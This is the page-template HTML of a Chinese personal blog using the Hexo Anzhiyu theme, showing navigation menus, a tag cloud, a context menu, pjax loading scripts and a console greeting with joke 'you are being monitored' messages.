class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://hexo.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" referrerpolicy="no-referrer" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=4940080934&amp;server=netease"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SSTI/" style="font-size: 0.88rem;">SSTI<sup>1</sup></a><a href="/tags/Web-Notes/" style="font-size: 0.88rem;">Web Notes<sup>3</sup></a><a href="/tags/Web-Writeups/" style="font-size: 0.88rem;">Web Writeups<sup>6</sup></a><a href="/tags/php/" style="font-size: 0.88rem;">php<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>1</sup></a><a href="/tags/%E8%BD%AC%E4%B8%93%E4%B8%9A/" style="font-size: 0.88rem;">转专业<sup>1</sup></a><a href="/tags/%E9%A3%8E%E6%99%AF/" style="font-size: 0.88rem;">风景<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("10/05/2025 14:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "© By 安知鱼 V1.6.15",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Jatopos 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
